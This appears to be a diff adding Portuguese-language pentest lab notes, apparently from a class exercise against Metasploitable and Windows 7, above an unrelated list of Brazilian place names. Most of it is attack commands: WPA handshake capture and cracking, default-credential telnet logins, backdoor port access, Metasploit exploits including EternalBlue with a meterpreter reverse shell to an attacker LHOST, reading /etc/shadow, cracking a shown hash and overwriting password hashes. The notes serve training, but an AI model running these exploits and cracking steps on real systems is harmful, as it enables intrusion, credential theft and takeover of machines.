@@ -1,3 +1,115 @@
+
+ ------------- instalara aircrack-ng, nmap, john(para md5), metasploit-framework.
+
+# sudo apt install aircrack-ng nmap john
+
+# sudo snap install metasploit-framework 
+
+# ------------- descobrir senha Wi-Fi 
+
+# 1) Verificar interface
+# sudo airmon-ng start wlan0
+
+# 1) Capturar handshake
+# sudo airodump-ng wlan0mon --essid XPTO -w captura
+
+# 3) Quebrar senha com aircrack-ng
+# sudo aircrack-ng -w /caminho/para/dicionário.txt captura-01.cap
+
+# ------------- Usar nmap para escanear a rede, identifique a Metasploitable e explore vulnerabilidades conhecidas (ex: vsftpd, UnrealIRCd, bindshell(root shell. porta: 1524)...).
+
+# nmap -sV -O 192.168.1.0/24
+
+
+# -------------- Tentar usuário e senha:
+
+#telnet 10.0.0.114
+# Name: msfadmin
+# Password: msfadmin
+
+# whoami
+# cat /etc/shadow
+
+
+# -------------- Tentar BackDoor já conhecidas:
+
+# telnet <ip do host> 1524
+# telnet 10.0.0.114 6200  
+
+# netcat para rede local
+# nc <ip do host> 1524    # ou:  netcat -nv <ip do host> 1524 
+
+
+
+# ------------- Aplicar exploits via Metasploit Framework (ou manualmente).
+
+# msfconsole
+
+# Buscar por serviços com vulnerabilidades conhecidas
+
+msf6 > search vsftpd  
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOSTS 10.0.0.114
+exploit
+
+msf6 > search samba
+use exploit/multi/samba/usermap_script
+set RHOSTS 10.0.0.114
+exploit
+
+msf6 > search unrealircd
+set RHOSTS 10.0.0.114
+set LHOST 10.0.0.131
+show payloads
+set payload cmd/unix/reverse
+exploit
+
+
+msf6 > search java_rmi
+msf6 > search distcc
+msf6 > search bindshell
+msf6 > search proftpd
+
+
+
+# ------------- Quebrar senha de usuário por dicionário:
+
+# identificar usuário no arquivo /ect/shadow:
+# cat /etc/shadow 
+
+usuario01:$6$.2NTgjbQFdhK9fHM$ub/G5rSO0QD1Ebf7fyJT4N2cO4gM.r7J1tsFNnL2bb9ygYnN3cF8IXcwsp3cXpbgEBjsb5jkyYeNpjqjws.GQ1:20422:0:99999:7:::
+
+# openssl passwd  -<$o númerno do tipo de criptografia> -salt '<$O salt>' -table -in <arquovo_dicionário> | grep '<Rash obtido com o comando cat>'
+ 
+# exemplo:
+# openssl passwd  -6 -salt '.2NTgjbQFdhK9fHM' -table -in lista1.txt | grep '$6$.2NTgjbQFdhK9fHM$ub/G5rSO0QD1Ebf7fyJT4N2cO4gM.r7J1tsFNnL2bb9ygYnN3cF8IXcwsp3cXpbgEBjsb5jkyYeNpjqjws.GQ1'
+ 
+
+# Último recurso é alterar o rash da senha do usuário por outra senha editando o arquivo /etc/shadow:
+# openssl passwd -6 <escolha a senha>      # gera o rash
+
+
+
+# -------------- BackDoor no Windows 7 (exploit EternalBlue para a vulnerabilidade MS17-010).
+
+msfconsole
+
+search eternalblue
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS [IP_ATACADO]
+set payload windows/x64/meterpreter/reverse_tcp
+set LHOST [SEU_IP_ATACANTE]
+set LPORT 4444
+exploit
+pwd
+cd \\Users\\alunoifpe\\Desktop\\
+pwd
+mkdir nome_da_pasta
+dir   # ou: ls
+
+
+======================================================
+
 brasil
 
 acre
